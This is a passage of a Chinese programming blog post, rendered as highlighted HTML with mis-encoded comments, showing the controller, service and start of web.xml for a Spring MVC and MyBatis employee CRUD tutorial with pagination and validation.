class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit.crud.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.Employee;</span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.Msg;</span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.service.EmployeeService;</span><br><span class="line"><span class="keyword">import</span> com.github.pagehelper.PageHelper;</span><br><span class="line"><span class="keyword">import</span> com.github.pagehelper.PageInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.<span class="keyword">factory</span>.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.validation.BindingResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.validation.FieldError;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.validation.Valid;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">List</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">Map</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet"> * </span>å¤„ç†å‘˜å·¥CRUDè¯·æ±‚</span></span></span><br><span class="line"><span class="comment"><span class="markdown"> *</span></span></span><br><span class="line"><span class="comment"><span class="markdown"> */</span></span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">EmployeeController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    EmployeeService employeeService;</span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>å•ä¸ªæ‰¹é‡äºŒåˆä¸€</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>æ‰¹é‡åˆ é™¤ï¼š1-2-3</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>å•ä¸ªåˆ é™¤ï¼š1</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@param ids</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@return</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     */</span></span></span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/emp/&#123;ids&#125;"</span>,method = RequestMethod.DELETE)</span><br><span class="line">    public Msg deleteEmp(<span class="meta">@PathVariable</span>(<span class="string">"ids"</span>)<span class="built_in">String</span> ids)&#123;</span><br><span class="line">        <span class="comment">//æ‰¹é‡åˆ é™¤</span></span><br><span class="line">        <span class="keyword">if</span>(ids.contains(<span class="string">"-"</span>))&#123;</span><br><span class="line">            <span class="built_in">List</span>&lt;Integer&gt; del_ids = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            <span class="built_in">String</span>[] str_ids = ids.split(<span class="string">"-"</span>);</span><br><span class="line">            <span class="comment">//ç»„è£…idçš„é›†åˆ</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="built_in">String</span> string : str_ids)&#123;</span><br><span class="line">                del_ids.add(Integer.parseInt(string));</span><br><span class="line">            &#125;</span><br><span class="line">            employeeService.deleteBatch(del_ids);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            Integer id = Integer.parseInt(ids);</span><br><span class="line">            employeeService.deleteEmp(id);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Msg.success();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>å¦‚æœç›´æ¥å‘é€ajax=PUTå½¢å¼çš„è¯·æ±‚</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>å°è£…çš„æ•°æ®</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>Employee</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>é—®é¢˜ï¼š</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>è¯·æ±‚ä½“ä¸­æœ‰æ•°æ®</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>ä½†æ˜¯Employeeå¯¹è±¡å°è£…ä¸ä¸Š</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>åŸå› ï¼š</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>tomcat:</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     *   </span>1. å°†è¯·æ±‚ä½“ä¸­çš„æ•°æ®ï¼Œå°è£…ä¸€ä¸ªmap</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     *   </span>2. request.getParameter("empName")å°±ä¼šä»è¿™ä¸ªmapä¸­å–å€¼</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     *   </span>3. SpringMVCå°è£…POJOå¯¹è±¡çš„æ—¶å€™ï¼Œä¼šæŠŠPOJOç§æ¯ä¸ªå±æ€§çš„å€¼ï¼Œrequest.getParamter("email");</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>AJAXä¸èƒ½ç›´æ¥å‘PUTè¯·æ±‚</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>Tomcatæ£€æµ‹åˆ°PUTè¯·æ±‚å°±ä¸ä¼šå°è£…è¯·æ±‚ä½“æ•°æ®ä¸ºmapï¼Œåªæœ‰POSTè¯·æ±‚æ‰ä¼šå°è£…è¯·æ±‚ä½“</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>org.apache.catalina.connector.Request;</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>parseParameters() ï¼ˆ3111ï¼‰</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     *</span></span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>æˆ‘ä»¬è¦èƒ½æ”¯æŒç›´æ¥å‘é€PUTä¹‹ç±»çš„è¯·æ±‚è¿˜è¦å°è£…è¯·æ±‚ä½“ä¸­çš„æ•°æ®</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>é…ç½®ä¸ŠHttpPutFormContentFilter</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>å®ƒçš„ä½œç”¨ï¼Œå°†è¯·æ±‚ä½“ä¸­çš„æ•°æ®è§£æåŒ…è£…æˆä¸€ä¸ªmapï¼Œrequestè¢«é‡æ–°åŒ…è£…,request.getParameter()è¢«é‡å†™ï¼Œå°±ä¼šä»è‡ªå·±å°è£…çš„mapä¸­å–æ•°æ®</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>å‘˜å·¥æ›´æ–°æ–¹æ³•</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@param employee</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@return</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     */</span></span></span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/emp/&#123;empId&#125;"</span>,method = RequestMethod.PUT)</span><br><span class="line">    public Msg saveEmp(Employee employee)&#123;</span><br><span class="line">        employeeService.updateEmp(employee);</span><br><span class="line">        <span class="keyword">return</span> Msg.success();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>æŒ‰ç…§å‘˜å·¥idæŸ¥è¯¢å‘˜å·¥</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@param id</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@return</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     */</span></span></span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value=<span class="string">"/emp/&#123;id&#125;"</span>,method=RequestMethod.GET)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    public Msg getEmp(<span class="meta">@PathVariable</span>(<span class="string">"id"</span>) Integer id)&#123;</span><br><span class="line">        Employee employee = employeeService.getEmp(id);</span><br><span class="line">        <span class="keyword">return</span> Msg.success().add(<span class="string">"emp"</span>,employee);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å¯ç”¨</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/checkUser"</span>)</span><br><span class="line">    public Msg checkUser(<span class="meta">@RequestParam</span>(<span class="string">"empName"</span>) <span class="built_in">String</span> empName)&#123;</span><br><span class="line">        <span class="comment">//å…ˆåˆ¤æ–­ç”¨æˆ·åæ˜¯å¦æ˜¯åˆæ³•çš„è¡¨è¾¾å¼;</span></span><br><span class="line">        <span class="built_in">String</span> regx = <span class="string">"(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\\u2E80-\\u9FFF]&#123;2,5&#125;)"</span>;</span><br><span class="line">        <span class="keyword">if</span>(!empName.matches(regx))&#123;</span><br><span class="line">            <span class="keyword">return</span> Msg.fail().add(<span class="string">"va_msg"</span>,<span class="string">"ç”¨æˆ·åå¿…é¡»æ˜¯6åˆ°16ä½æ•°å­—å’Œå­—æ¯çš„ç»„åˆæˆ–2-5ä½ä¸­æ–‡"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//æ•°æ®åº“ç”¨æˆ·åé‡å¤æ ¡éªŒ</span></span><br><span class="line">        boolean b = employeeService.checkUser(empName);</span><br><span class="line">        <span class="keyword">if</span>(b)&#123;</span><br><span class="line">            <span class="keyword">return</span> Msg.success();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Msg.fail().add(<span class="string">"va_msg"</span>,<span class="string">"ç”¨æˆ·åä¸å¯ç”¨"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>å‘˜å·¥ä¿å­˜</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>1.æ”¯æŒJSR303æ ¡éªŒ</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>2. å¯¼å…¥Hibernate-validator</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@param employee</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@return</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     */</span></span></span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/emp"</span>,method = RequestMethod.POST)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    public Msg saveEmp(<span class="meta">@Valid</span>  Employee employee, BindingResult result)&#123;</span><br><span class="line">        <span class="keyword">if</span>(result.hasErrors())&#123;</span><br><span class="line">            <span class="comment">//æ ¡éªŒå¤±è´¥åº”è¯¥è¿”å›å¤±è´¥ï¼Œåœ¨æ¨¡æ€æ¡†ä¸­æ˜¾ç¤ºæ ¡éªŒå¤±è´¥çš„é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">            <span class="built_in">Map</span>&lt;<span class="built_in">String</span>,<span class="built_in">Object</span>&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            <span class="built_in">List</span>&lt;FieldError&gt; errors = result.getFieldErrors();</span><br><span class="line">            <span class="keyword">for</span>(FieldError fieldError : errors)&#123;</span><br><span class="line">                System.out.println(<span class="string">"é”™è¯¯çš„å­—æ®µåï¼š"</span>+fieldError.getField());</span><br><span class="line">                System.out.println(<span class="string">"é”™è¯¯ä¿¡æ¯ï¼š"</span>+fieldError.getDefaultMessage());</span><br><span class="line">                map.put(fieldError.getField(),fieldError.getDefaultMessage());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> Msg.fail().add(<span class="string">"errorFields"</span>,map);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            employeeService.saveEmp(employee);</span><br><span class="line">            <span class="keyword">return</span> Msg.success();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>å¯¼å…¥jacksonåŒ…</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@param pn</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@return</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     */</span></span></span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/emps"</span>)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    public Msg getEmpsWithJson(<span class="meta">@RequestParam</span>(value = <span class="string">"pn"</span>,defaultValue = <span class="string">"1"</span>)Integer pn)&#123;</span><br><span class="line">        <span class="comment">//è¿™ä¸æ˜¯ä¸€ä¸ªåˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line">        <span class="comment">//å¼•å…¥PageHelperåˆ†é¡µæ’ä»¶</span></span><br><span class="line">        <span class="comment">//åœ¨æŸ¥è¯¢ä¹‹å‰åªéœ€è¦è°ƒç”¨,ä¼ å…¥é¡µç ä»¥åŠæ¯é¡µçš„ä¸ªæ•°</span></span><br><span class="line">        PageHelper.startPage(pn,<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//startPageåé¢ç´§è·Ÿçš„è¿™ä¸ªæŸ¥è¯¢å°±æ˜¯ä¸€ä¸ªåˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line">        <span class="built_in">List</span>&lt;Employee&gt; emps = employeeService.getAll();</span><br><span class="line">        <span class="comment">//ä½¿ç”¨PageInfoåŒ…è£…æŸ¥è¯¢åçš„ç»“æœï¼Œåªéœ€è¦å°†PageInfoäº¤ç»™é¡µé¢å°±è¡Œäº†</span></span><br><span class="line">        <span class="comment">//å°è£…äº†è¯¦ç»†çš„åˆ†é¡µä¿¡æ¯ï¼ŒåŒ…æ‹¬æœ‰æˆ‘ä»¬æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®,è¿ç»­æ˜¾ç¤ºçš„é¡µæ•°</span></span><br><span class="line">        PageInfo page= <span class="keyword">new</span> PageInfo(emps,<span class="number">5</span>);</span><br><span class="line">        <span class="keyword">return</span> Msg.success().add(<span class="string">"pageInfo"</span>,page);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>æŸ¥è¯¢å‘˜å·¥æ•°æ®(åˆ†é¡µæŸ¥è¯¢)</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="bullet">     * </span>@return</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span class="code">     */</span></span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//@RequestMapping("/emps")</span></span><br><span class="line">    public <span class="built_in">String</span> getEmps(<span class="meta">@RequestParam</span>(value = <span class="string">"pn"</span>,defaultValue = <span class="string">"1"</span>)Integer pn, Model model)&#123;</span><br><span class="line">        <span class="comment">//è¿™ä¸æ˜¯ä¸€ä¸ªåˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line">        <span class="comment">//å¼•å…¥PageHelperåˆ†é¡µæ’ä»¶</span></span><br><span class="line">        <span class="comment">//åœ¨æŸ¥è¯¢ä¹‹å‰åªéœ€è¦è°ƒç”¨,ä¼ å…¥é¡µç ä»¥åŠæ¯é¡µçš„ä¸ªæ•°</span></span><br><span class="line">        PageHelper.startPage(pn,<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//startPageåé¢ç´§è·Ÿçš„è¿™ä¸ªæŸ¥è¯¢å°±æ˜¯ä¸€ä¸ªåˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line">        <span class="built_in">List</span>&lt;Employee&gt; emps = employeeService.getAll();</span><br><span class="line">        <span class="comment">//ä½¿ç”¨PageInfoåŒ…è£…æŸ¥è¯¢åçš„ç»“æœï¼Œåªéœ€è¦å°†PageInfoäº¤ç»™é¡µé¢å°±è¡Œäº†</span></span><br><span class="line">        <span class="comment">//å°è£…äº†è¯¦ç»†çš„åˆ†é¡µä¿¡æ¯ï¼ŒåŒ…æ‹¬æœ‰æˆ‘ä»¬æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®,è¿ç»­æ˜¾ç¤ºçš„é¡µæ•°</span></span><br><span class="line">        PageInfo page= <span class="keyword">new</span> PageInfo(emps,<span class="number">5</span>);</span><br><span class="line">        model.addAttribute(<span class="string">"pageInfo"</span>,page);</span><br><span class="line">        page.getNavigatepageNums();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"list"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æœ€åçš„EmployeeService<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.crud.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.Employee;</span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.EmployeeExample;</span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.dao.EmployeeMapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmployeeService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    EmployeeMapper employeeMapper;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æŸ¥è¯¢æ‰€æœ‰å‘˜å·¥</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Employee&gt; <span class="title">getAll</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">return</span> employeeMapper.selectByExampleWithDept(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å‘˜å·¥ä¿å­˜æ–¹æ³•</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saveEmp</span><span class="params">(Employee employee)</span></span>&#123;</span><br><span class="line">        employeeMapper.insertSelective(employee);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ£€éªŒç”¨æˆ·åæ˜¯å¦å¯ç”¨</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> empName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> true ä»£è¡¨å½“å‰å§“åå¯ç”¨ false ä»£è¡¨ä¸å¯ç”¨</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkUser</span><span class="params">(String empName)</span> </span>&#123;</span><br><span class="line">        EmployeeExample example = <span class="keyword">new</span> EmployeeExample();</span><br><span class="line">        EmployeeExample.Criteria criteria = example.createCriteria();</span><br><span class="line">        criteria.andEmpNameEqualTo(empName);</span><br><span class="line">        <span class="keyword">long</span> count = employeeMapper.countByExample(example);</span><br><span class="line">        <span class="keyword">return</span> count==<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Employee <span class="title">getEmp</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        Employee employee = employeeMapper.selectByPrimaryKey(id);</span><br><span class="line">        <span class="keyword">return</span> employee;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å‘˜å·¥æ›´æ–°</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> employee</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateEmp</span><span class="params">(Employee employee)</span></span>&#123;</span><br><span class="line">        employeeMapper.updateByPrimaryKeySelective(employee);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å‘˜å·¥åˆ é™¤</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteEmp</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">        employeeMapper.deleteByPrimaryKey(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteBatch</span><span class="params">(List&lt;Integer&gt; ids)</span> </span>&#123;</span><br><span class="line">        EmployeeExample example = <span class="keyword">new</span> EmployeeExample();</span><br><span class="line">        EmployeeExample.Criteria criteria = example.createCriteria();</span><br><span class="line">        <span class="comment">//delete from xxx where emp_id in(1,2,3)</span></span><br><span class="line">        criteria.andEmpIdIn(ids);</span><br><span class="line">        employeeMapper.deleteByExample(example);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æœ€åçš„web.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         